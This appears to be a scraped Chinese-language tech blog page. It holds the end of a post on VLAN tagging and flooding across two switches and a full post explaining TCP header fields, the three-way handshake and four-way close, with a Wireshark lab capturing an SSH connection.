+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分析</span></span><br><span class="line">1.两台交换机，8台主机，划分两个网络组 VLAN10 VLAN20</span><br><span class="line">2.以太网帧在PC1 -&gt; Access1(PVID=10) <span class="comment"># Acccess1属于VLAN10 PVID=10</span></span><br><span class="line">3.帧被Access1标记 untagged frame -&gt; tagged frame(PVID=10)</span><br><span class="line"><span class="comment"># 此时，以太网帧成功进入交换机A，且为标记帧，后续传输过程如下：</span></span><br><span class="line">--情况一：单播</span><br><span class="line">条件：交换机A、B MAC表中均记录PC6的物理地址信息</span><br><span class="line">标记帧直接通过Trunk进入交换机B，再传入Access6，接口将标记撕毁，帧还原 tagged frame -&gt; untagged frame</span><br><span class="line">Access6 -&gt; PC6 传输完成</span><br><span class="line">--情况二：泛洪</span><br><span class="line">条件：交换机A、B MAC表均无PC6记录 </span><br><span class="line">标记帧向两台交换机所有VLAN10网络组Access传输 被传输的接口满足 PVID=10</span><br><span class="line">Access 2 5 6 三个接口收到标记帧，Access将标记帧标记撕毁并将以太网帧向对应主机传输</span><br><span class="line">若PC2 PC5收到以太网帧则丢弃 PC6收到以太网帧则保留</span><br><span class="line"><span class="comment"># 若其中一台交换机对PC6有记录，此交换机不泛洪其他VLAN10接口，另一台则泛洪其他VLAN10接口</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/04/01/network-basic/2026-04-01-tcp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/01/network-basic/2026-04-01-tcp/" class="post-title-link" itemprop="url">网络通讯协议—TCP协议原理</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-01 22:00:00" itemprop="dateCreated datePublished" datetime="2026-04-01T22:00:00+08:00">2026-04-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-10-12 15:42:31" itemprop="dateModified" datetime="2026-10-12T15:42:31+08:00">2026-10-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/" itemprop="url" rel="index"><span itemprop="name">network</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/tcp/" itemprop="url" rel="index"><span itemprop="name">tcp</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="网络通讯协议—TCP协议原理"><a href="#网络通讯协议—TCP协议原理" class="headerlink" title="网络通讯协议—TCP协议原理"></a>网络通讯协议—TCP协议原理</h2><h3 id="1-0-概述"><a href="#1-0-概述" class="headerlink" title="1.0 概述"></a>1.0 概述</h3><p>TCP协议全称（传输控制协议）一种面向连接的、可靠的、基于字节流的<strong>传输层</strong>通信协议；</p>
+<p>为实现面向连接，在发送数据之前必须在两端建立连接，方法是“<strong>三次握手</strong>”；</p>
+<p>为保证可靠性，则需TCP报文中的段编号以及确认号。</p>
+<p>简单来说就是给每个包一个序号，序号保证了传输到接收端的数据包是按顺序接收；</p>
+<p>接收端成功接收到字节则回复一个(ACK)；</p>
+<h4 id="1-0-1-TCP报文结构："><a href="#1-0-1-TCP报文结构：" class="headerlink" title="1.0.1 TCP报文结构："></a>1.0.1 TCP报文结构：</h4><p><img data-src="/2026/04/01/network-basic/2026-04-01-tcp/TCP%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png"></p>
+<h4 id="1-0-2-报文重点信息说明："><a href="#1-0-2-报文重点信息说明：" class="headerlink" title="1.0.2 报文重点信息说明："></a>1.0.2 报文重点信息说明：</h4><ul>
+<li><p><code>Source Port Number [源端口]</code></p>
+<p>字段说明：（占用16bits，即2byte）</p>
+<p>表示网络访问来源处的端口号，指定了发送端的传输层协议端口信息（一般是随机生成）</p>
+</li>
+<li><p><code>Destination Port Number [目标端口]</code></p>
+<p>字段说明：（占用16bits，即2byte）</p>
+<p>表示网络访问目的处的端口号；即指定了接受端的传输层协议端口信息（根据访问的服务进行指定）</p>
+</li>
+</ul>
+<p><strong>引申</strong>：通过以上信息不难发现，源&#x2F;目标端口均占用16bits，因此可以通过计算得知其端口号范围</p>
+<p>2^16 &#x3D; 65536 （端口号数量 &#x3D; 65536）</p>
+<p>最大端口号 &#x3D; 65535 端口号范围 0~65535</p>
+<p>其中 0 号端口一般不使用，0~1023 端口是知名端口（例如HTTP 80），已经被占用。</p>
+<ul>
+<li><p><code>Sequence Number [序列号]</code></p>
+<p>字段说明：（占用32bits 4字节）</p>
+<p>每一个TCP报文段都会有一个序列号，序列号字段的值其实是本报文段所发送的数据的第一个字节的序号。</p>
+<p>这是因为TCP是面向连接的可靠服务，其每一个字节都会对应一个序号，通过序号来确保服务的可靠性和有序性。</p>
+</li>
+<li><p><code>Acknowledgement Number [确认号]</code></p>
+<p>字段说明：（占用32bit，即4字节）</p>
+<p>确认号，是期望收到对方的下一个报文段的数据的第一个字节的序列号，可以有效核实传输的数据是否准确。</p>
+</li>
+<li><p><code>SYN 字段</code></p>
+<p>字段置为1时，表示发送方请求和接收方建立连接</p>
+</li>
+<li><p><code>FIN 字段</code></p>
+<p>字段设置为1时，表示某一方请求和对方断开连接</p>
+</li>
+<li><p><code>ACK 字段</code></p>
+<p>ACK标志位为1时，表示本报文中的“确认号”字段有意义。通常除第一个SYN报文外，所有TCP报文都将ACK置1。</p>
+<p><strong><code>ACK = 1</code> 使 <code>ack = x+1</code> 生效，它告诉对方：我已经收到 <code>seq = x</code> 的数据，请你接下来发送 <code>seq = x+1</code> 的数据给我。</strong></p>
+</li>
+</ul>
+<h3 id="2-0-TCP通讯原理"><a href="#2-0-TCP通讯原理" class="headerlink" title="2.0 TCP通讯原理"></a>2.0 TCP通讯原理</h3><h4 id="2-0-1-三次握手—通讯建立"><a href="#2-0-1-三次握手—通讯建立" class="headerlink" title="2.0.1 三次握手—通讯建立"></a>2.0.1 三次握手—通讯建立</h4><p><img data-src="/2026/04/01/network-basic/2026-04-01-tcp/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%8E%9F%E7%90%86.png"></p>
+<ul>
+<li><p>第一次握手 <code>Host A ==&gt; Host B</code></p>
+<p>Host A 向 Host B发送建立TCP连接请求的报文。</p>
+<p><strong>SYN &#x3D; 1, seq &#x3D; x</strong> (注意：此时的序列号是随机生成)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在第一次握手过程中每个字段的理解:</span></span><br><span class="line"><span class="comment"># 表示Host A期望与Host B建立一个连接</span></span><br><span class="line">SYN = 1</span><br><span class="line"><span class="comment"># Host A发送报文，随机一个序列号x</span></span><br><span class="line"><span class="built_in">seq</span> = x</span><br><span class="line"><span class="comment">## 特别注意，此时省略ACK = 0不显示,因为还未接收到Host B的任何数据故ack为空。</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第二次握手 <code>Host B ==&gt; Host A</code></p>
+<p>Host B 向 Host A 回复，已经收到Host A发送的TCP连接请求报文。</p>
+<p><strong>ACK &#x3D; 1, SYN  &#x3D; 1, seq &#x3D; y, ack &#x3D; x + 1</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在第二次握手过程中每个字段的理解：</span></span><br><span class="line"><span class="comment"># 表示已经收到Host A 发送的TCP连接请求报文</span></span><br><span class="line">ACK = 1</span><br><span class="line"><span class="comment"># 表示Host B也期望与Host A建立连接</span></span><br><span class="line">SYN = 1</span><br><span class="line"><span class="comment"># Host B生成随机序列号</span></span><br><span class="line"><span class="built_in">seq</span> = y</span><br><span class="line"><span class="comment"># 表示Host B期望下一次收到Host A发送的报文序列号是X+1</span></span><br><span class="line">ack = x + 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第三次握手 <code>Host A ==&gt; Host B</code></p>
+<p>Host A 向 Host B 回复，已经收到Host B发送的TCP连接请求报文。</p>
+<p><strong>ACK &#x3D; 1, seq &#x3D; x + 1, ack &#x3D; y + 1</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在第三次握手过程中每个字段的理解：</span></span><br><span class="line"><span class="comment"># 表示已经收到Host B回复的TCP连接请求报文</span></span><br><span class="line">ACK = 1</span><br><span class="line"><span class="comment"># 向Host B发送的序列号，此时为x+1，与第二次握手时Host B发送的确认号对应（ack = x + 1）</span></span><br><span class="line"><span class="built_in">seq</span> = x + 1</span><br><span class="line"><span class="comment"># 期望Host B 下一次回复的序列号是y+1；若下一次有数据传输，则Host B向Host A回复seq = y + 1</span></span><br><span class="line">ack = y + 1</span><br></pre></td></tr></table></figure>
+
+<p>经过以上三次握手过程，两台主机已经建立完整可靠的TCP连接。</p>
+</li>
+</ul>
+<h4 id="2-0-2-四次挥手—通讯断开"><a href="#2-0-2-四次挥手—通讯断开" class="headerlink" title="2.0.2 四次挥手—通讯断开"></a>2.0.2 四次挥手—通讯断开</h4><p><img data-src="/2026/04/01/network-basic/2026-04-01-tcp/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%E5%8E%9F%E7%90%86.png"></p>
+<ul>
+<li><p>第一次挥手 <code>Host A ==&gt; Host B</code></p>
+<p>Host A 向 Host B发送断开TCP连接请求报文。</p>
+<p><strong>FIN &#x3D; 1, ACK &#x3D; 1, seq &#x3D; 101, ack &#x3D; 301</strong> （假设此时两台主机传输报文序列号为：101，301）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在第一次挥手过程中每个字段的理解：</span></span><br><span class="line"><span class="comment"># 表示Host A主动向Host B发送断开TCP连接请求</span></span><br><span class="line">FIN = 1</span><br><span class="line"><span class="comment"># 此时Host A还在接收Host B发送的数据包，则需要回复ACK字段</span></span><br><span class="line">ACK = 1 </span><br><span class="line"><span class="comment"># 向Host B发送的序列号101</span></span><br><span class="line"><span class="built_in">seq</span> = 101</span><br><span class="line"><span class="comment"># 期望下一次Host B 回复的序列号是301</span></span><br><span class="line">ack = 301</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第二次挥手 <code>Host B ==&gt; Host A</code></p>
+<p>Host B接收到Host A发送的断开连接请求报文。</p>
+<p><strong>ACK &#x3D; 1, seq &#x3D; 301, ack &#x3D; 102</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在第二次挥手过程中每个字段的理解：</span></span><br><span class="line"><span class="comment"># 被动关闭方收到FIN后，先回复ACK，表示已收到关闭请求。如果自己还有数据未发送完，则继续发送；待数据发完后，再主动发送FIN。</span></span><br><span class="line">ACK = 1</span><br><span class="line"><span class="comment"># 向Host A发送序列号301</span></span><br><span class="line"><span class="built_in">seq</span> = 301</span><br><span class="line"><span class="comment"># 期望下一次收到Host A的序列号报文是102</span></span><br><span class="line">ack = 102</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第三次挥手 <code>Host B ==&gt; Host A</code></p>
+<p>Host B向Host A发送断开连接请求报文。</p>
+<p><strong>FIN &#x3D; 1, ACK &#x3D; 1, seq &#x3D; 301, ack &#x3D; 102</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在第三次挥手过程中每个字段的理解：</span></span><br><span class="line"><span class="comment"># Host B向Host A发送断开连接请求报文</span></span><br><span class="line">FIN = 1</span><br><span class="line"><span class="comment"># 回复确认字段</span></span><br><span class="line">ACK = 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第四次挥手 <code>Host A ==&gt; Host B</code></p>
+<p>Host A向Host B回复最后一次断开TCP连接请求报文</p>
+<p><strong>ACK  &#x3D; 1, seq &#x3D; 102, ack &#x3D; 302</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在第四次挥手过程中每个字段的理解：</span></span><br><span class="line"><span class="comment"># 确认收到Host B发送的报文</span></span><br><span class="line">ACK = 1</span><br><span class="line"><span class="comment"># 回复序列号字段102</span></span><br><span class="line"><span class="built_in">seq</span> = 102</span><br><span class="line"><span class="comment"># 期望下一次收到Host B的序列号报文302</span></span><br><span class="line">ack = 302</span><br></pre></td></tr></table></figure>
+
+<p>经过以上四次挥手过程，TCP连接成功断开。</p>
+</li>
+</ul>
+<h3 id="3-0-实践"><a href="#3-0-实践" class="headerlink" title="3.0 实践"></a>3.0 实践</h3><h4 id="3-0-1-实践TCP通讯原理"><a href="#3-0-1-实践TCP通讯原理" class="headerlink" title="3.0.1 实践TCP通讯原理"></a>3.0.1 实践TCP通讯原理</h4><ul>
+<li><p>环境准备：</p>
+<p>CentOS 7</p>
+<p>Wireshark 抓包工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 案例使用SSH连接体现TCP三次握手及四次挥手过程</span></span><br><span class="line"><span class="comment"># 查看网卡信息，确认本机IP</span></span><br><span class="line">ip a <span class="comment"># 10.0.0.100</span></span><br><span class="line"><span class="comment"># Xshell建立本地shell会话</span></span><br><span class="line"><span class="comment"># Wireshark选择VMnet8网卡</span></span><br><span class="line"><span class="comment"># 用本地shell建立ssh连接；此动作相当于模拟访问10.0.0.100服务器</span></span><br><span class="line">ssh 10.0.0.100</span><br><span class="line"><span class="comment"># 此时10.0.0.1模拟客户端；10.0.0.100模拟服务端</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/04/01/network-basic/2026-04-01-tcp/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.png"></p>
+<blockquote>
+<p>Wireshark页面显示TCP三次握手详细信息</p>
+</blockquote>
+<p><img data-src="/2026/04/01/network-basic/2026-04-01-tcp/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.png"></p>
+<blockquote>
+<p>Wireshark页面显示TCP四次挥手详细信息</p>
+</blockquote>
+</li>
+</ul>
 
       
     </div>
